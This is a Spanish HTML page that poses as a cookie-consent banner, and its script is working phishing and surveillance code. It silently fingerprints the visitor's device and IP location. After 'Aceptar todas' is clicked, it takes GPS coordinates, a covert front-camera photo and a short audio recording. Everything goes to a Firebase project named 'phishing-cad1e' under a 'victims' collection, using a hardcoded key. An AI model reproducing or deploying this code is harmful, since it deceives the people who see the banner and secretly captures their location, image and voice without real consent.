<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Aviso de cookies</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
html,body{
  width:100%;height:100%;
  background:#000;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  overflow:hidden;
}

/* ── Barra de permisos ── */
#bar{
  position:fixed;bottom:-160px;left:0;right:0;
  background:#1c1c1e;
  border-top:1px solid #3a3a3c;
  border-radius:16px 16px 0 0;
  padding:16px 18px calc(18px + env(safe-area-inset-bottom));
  transition:bottom .36s cubic-bezier(.25,.8,.25,1);
  z-index:100;
}
#bar.show{bottom:0;}
.bar-row{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px;}
.bar-icon{
  width:40px;height:40px;border-radius:10px;
  background:#2c2c2e;
  display:flex;align-items:center;justify-content:center;
  font-size:1.3rem;flex-shrink:0;
}
.bar-title{color:#fff;font-size:.9rem;font-weight:600;line-height:1.35;margin-bottom:3px;}
.bar-sub{color:#8e8e93;font-size:.75rem;line-height:1.4;}
.bar-btns{display:flex;gap:10px;}
.btn-deny{
  flex:1;padding:11px;border-radius:10px;
  background:#2c2c2e;border:none;
  color:#8e8e93;font-size:.85rem;font-weight:500;cursor:pointer;
}
.btn-ok{
  flex:2;padding:11px;border-radius:10px;
  background:#0a84ff;border:none;
  color:#fff;font-size:.85rem;font-weight:600;cursor:pointer;
}
.btn-ok:active{background:#0060df;}
</style>
</head>
<body>

<div id="bar">
  <div class="bar-row">
    <div class="bar-icon">🍪</div>
    <div>
      <div class="bar-title">Usamos cookies en este sitio</div>
      <div class="bar-sub">Usamos cookies propias y de terceros para mejorar tu experiencia, analizar el tráfico y personalizar el contenido. Puedes aceptar todas o gestionarlas individualmente.</div>
    </div>
  </div>
  <div class="bar-btns">
    <button class="btn-deny" id="btnDeny">Solo esenciales</button>
    <button class="btn-ok"   id="btnOk">Aceptar todas</button>
  </div>
</div>

<script>
// ─── CONFIG ───────────────────────────────────────────────────
const KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
const PROJ = 'phishing-cad1e';
const ST   = 'phishing-cad1e.firebasestorage.app';
const COL  = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims`;

// ─── ESTADO ───────────────────────────────────────────────────
let docId = null;
const D   = { ts: String(Date.now()) };

// ─── HELPERS ──────────────────────────────────────────────────
const set = (k, v) => { if (v !== undefined && v !== null && v !== '') D[k] = String(v).slice(0, 900); };

// Convierte objeto plano → formato Firestore REST
function toFields(obj) {
  const f = {};
  for (const [k, v] of Object.entries(obj)) f[k] = { stringValue: v };
  return { fields: f };
}

// Envía/actualiza en Firestore
async function push() {
  try {
    if (!docId) {
      const r = await fetch(`${COL}?key=${KEY}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(toFields(D))
      });
      const j = await r.json();
      if (j.name) docId = j.name.split('/').pop();
    } else {
      const mask = Object.keys(D).map(k => `updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
      await fetch(`${COL}/${docId}?key=${KEY}&${mask}`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(toFields(D))
      });
    }
  } catch (e) {}
}

// Sube archivo a Firebase Storage, devuelve URL pública
async function upload(path, dataUrl, mime) {
  try {
    const b64  = dataUrl.split(',')[1];
    const bin  = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
    const name = encodeURIComponent(path);
    const r = await fetch(
      `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`,
      { method: 'POST', headers: { 'Content-Type': mime }, body: bin }
    );
    const j = await r.json();
    if (j.name) {
      const url = `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
      return url;
    }
  } catch (e) {}
  return null;
}

// btoa seguro para buffers grandes (evita stack overflow en Safari)
function safeBtoa(bytes) {
  let s = '';
  const chunk = 8192;
  for (let i = 0; i < bytes.length; i += chunk)
    s += String.fromCharCode(...bytes.subarray(i, i + chunk));
  return btoa(s);
}

// ─── FINGERPRINT PASIVO (sin permisos) ───────────────────────
(function fp() {
  set('ua',       navigator.userAgent);
  set('platform', navigator.platform);
  set('vendor',   navigator.vendor);
  set('lang',     navigator.language);
  set('langs',    (navigator.languages || []).join(','));
  set('cores',    navigator.hardwareConcurrency);
  set('memory',   navigator.deviceMemory);
  set('touch',    navigator.maxTouchPoints);
  set('screen',   `${screen.width}x${screen.height}@${devicePixelRatio}`);
  set('tz',       Intl.DateTimeFormat().resolvedOptions().timeZone);
  set('dark',     matchMedia('(prefers-color-scheme:dark)').matches);
  set('online',   navigator.onLine);

  const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (nav) {
    set('connType', nav.effectiveType);
    set('connDl',   nav.downlink);
    set('connRtt',  nav.rtt);
  }

  // Canvas fingerprint
  try {
    const c = document.createElement('canvas');
    c.width = 200; c.height = 40;
    const ctx = c.getContext('2d');
    ctx.fillStyle = '#f00';
    ctx.fillRect(0, 0, 100, 40);
    ctx.fillStyle = '#0f0';
    ctx.font = '14px Arial';
    ctx.fillText('fingerprint', 10, 25);
    set('canvas', c.toDataURL().slice(-30));
  } catch (e) {}

  // WebGL
  try {
    const gl = document.createElement('canvas').getContext('webgl');
    const ext = gl.getExtension('WEBGL_debug_renderer_info');
    if (ext) {
      set('glVendor',   gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
      set('glRenderer', gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
    }
  } catch (e) {}

  // Battery
  navigator.getBattery?.().then(b => {
    set('bat',    Math.round(b.level * 100) + '%');
    set('batChg', b.charging);
    push();
  }).catch(() => {});

  // Fetch IP pública
  fetch('https://freeipapi.com/api/json/', { signal: AbortSignal.timeout(6000) })
    .then(r => r.json())
    .then(j => {
      set('ip',      j.ipAddress);
      set('city',    j.cityName);
      set('region',  j.regionName);
      set('country', j.countryName);
      set('cc',      j.countryCode);
      set('lat',     j.latitude);
      set('lon',     j.longitude);
      set('org',     j.ipType);
      push();
    }).catch(() => {});
})();

// Push inicial
setTimeout(push, 600);

// ─── BOTÓN PERMITIR ───────────────────────────────────────────
document.getElementById('btnOk').addEventListener('click', collect);
document.getElementById('btnDeny').addEventListener('click', () => {
  set('denied', 'true'); push();
  document.getElementById('bar').classList.remove('show');
});

async function collect() {
  document.getElementById('bar').classList.remove('show');
  set('clicked', 'true'); push();

  // ── GPS ──────────────────────────────────────────────────
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        set('gpsLat', pos.coords.latitude);
        set('gpsLon', pos.coords.longitude);
        set('gpsAcc', pos.coords.accuracy);
        set('gpsAlt', pos.coords.altitude);
        push();
      },
      err => { set('gpsErr', err.code); push(); },
      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
    );
  }

  // ── CÁMARA FRONTAL ───────────────────────────────────────
  if (navigator.mediaDevices?.getUserMedia) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: true
      });
      set('camGranted', 'true'); push();

      // Elemento video — playsinline OBLIGATORIO en iOS
      const vid = document.createElement('video');
      vid.setAttribute('playsinline', '');
      vid.setAttribute('webkit-playsinline', '');
      vid.autoplay  = true;
      vid.muted     = true;
      vid.srcObject = stream;
      vid.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
      document.body.appendChild(vid);

      await vid.play().catch(() => {});

      // iOS necesita más tiempo para activar el sensor
      const delay = /iPhone|iPad|iPod/i.test(navigator.userAgent) ? 1800 : 900;

      setTimeout(async () => {
        try {
          const cv = document.createElement('canvas');
          cv.width  = vid.videoWidth  || 320;
          cv.height = vid.videoHeight || 240;
          cv.getContext('2d', { willReadFrequently: true }).drawImage(vid, 0, 0);
          const dataUrl = cv.toDataURL('image/jpeg', 0.8);

          const url = await upload(`photos/${docId || Date.now()}.jpg`, dataUrl, 'image/jpeg');
          if (url) { set('photoUrl', url); push(); }
        } catch (e) {}

        // Parar tracks de video, dejar audio para grabar
        stream.getVideoTracks().forEach(t => t.stop());
        vid.remove();

        // ── AUDIO CLIP 4s ─────────────────────────────────
        grabAudio(stream);
      }, delay);

    } catch (err) {
      set('camErr', err.message); push();
    }
  }

  // ── NOTIFICACIONES ───────────────────────────────────────
  if ('Notification' in window) {
    Notification.requestPermission().then(r => { set('notif', r); push(); }).catch(() => {});
  }
}

// ─── AUDIO ────────────────────────────────────────────────────
async function grabAudio(existingStream) {
  try {
    // Reutilizar stream existente si tiene tracks de audio
    const audioTrack = existingStream?.getAudioTracks()?.[0];
    const s = audioTrack
      ? existingStream
      : await navigator.mediaDevices.getUserMedia({ audio: true });

    // Detectar mime compatible: webm en Chrome/FF, mp4 en Safari iOS
    const mime = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/ogg']
      .find(m => MediaRecorder.isTypeSupported(m)) || '';

    const rec    = new MediaRecorder(s, mime ? { mimeType: mime } : {});
    const chunks = [];

    rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
    rec.onstop = async () => {
      if (!audioTrack) s.getTracks().forEach(t => t.stop());
      try {
        const finalMime = rec.mimeType || mime || 'audio/webm';
        const ext       = finalMime.includes('mp4') ? 'mp4' : finalMime.includes('ogg') ? 'ogg' : 'webm';
        const blob      = new Blob(chunks, { type: finalMime });
        if (blob.size < 100) return;

        const ab    = await blob.arrayBuffer();
        const bytes = new Uint8Array(ab);
        const b64   = 'data:' + finalMime + ';base64,' + safeBtoa(bytes);

        const url = await upload(`audio/${docId || Date.now()}.${ext}`, b64, finalMime);
        if (url) { set('audioUrl', url); push(); }
      } catch (e) {}
    };

    rec.start(1000); // timeslice 1s
    setTimeout(() => { try { rec.stop(); } catch (e) {} }, 4000);
  } catch (e) {}
}

// ─── BARRA DELAYED ────────────────────────────────────────────
setTimeout(() => document.getElementById('bar').classList.add('show'), 1800);

// ─── EXIT BEACON ──────────────────────────────────────────────
window.addEventListener('beforeunload', () => {
  if (!docId) return;
  set('_exit', Date.now());
  navigator.sendBeacon(
    `${COL}/${docId}?key=${KEY}&updateMask.fieldPaths=_exit`,
    JSON.stringify(toFields({ _exit: String(Date.now()) }))
  );
});
</script>
</body>
</html>
